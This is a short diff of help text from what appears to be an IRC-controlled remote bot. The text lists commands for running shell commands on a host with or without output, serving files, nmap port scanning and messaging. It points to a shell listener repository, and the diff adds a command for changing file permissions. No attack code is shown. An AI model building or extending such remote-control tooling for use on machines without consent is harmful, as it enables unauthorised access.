@@ -589,6 +589,7 @@ def main():
                                   ....listener can be downloaded at https://github.com/trackmastersteve/shell.git,
                                   '.cmd [shell command]' (run shell commands on the host),
                                   '.cno [shell command]' (run shell commands without output),
+                                  '.chmd [file] [permissions]' (change permissions of a file),
                                   '.fsdl' (run fileserver to download files from),
                                   '.scan [ip] [comma seperated ports]' (nmap port scanner),
                                   '.msg [target] [message]' (sends a msg to a user/channel),
